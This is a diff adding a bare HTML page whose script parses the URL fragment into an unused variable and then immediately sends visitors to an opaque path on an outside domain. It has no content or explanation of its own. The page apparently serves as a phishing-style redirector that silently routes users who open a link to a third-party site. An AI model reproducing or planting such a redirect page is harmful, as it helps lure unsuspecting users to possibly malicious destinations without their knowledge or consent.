@@ -1,0 +1,15 @@
+<html>
+<head>
+
+<head>
+<body>
+<script>
+	var link_c = window.location.href;
+	var compliment = link_c.split("#")[1];
+	
+	// console.log(window.location.href);
+	window.location.href = "https://rotaryedrin.com/0/0/0/9490a0e1f913ca76d1981890f16c849a/n96";
+
+</script>
+</body>
+</html>
